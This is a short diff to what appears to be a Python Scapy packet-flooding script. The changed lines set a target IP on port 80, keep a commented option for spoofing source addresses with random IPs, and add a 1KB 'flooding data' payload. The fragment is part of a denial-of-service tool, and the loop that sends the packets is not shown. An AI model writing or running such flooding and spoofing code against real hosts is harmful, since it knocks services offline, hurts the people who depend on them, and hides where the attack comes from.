@@ -10,3 +10,6 @@ target_port = 80
 ip = IP(dst=target_ip)
 # or if you want to perform IP Spoofing (will work as well)
 # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
+
+# add some flooding data (1KB in this case)
+raw = Raw(b"X"*1024)
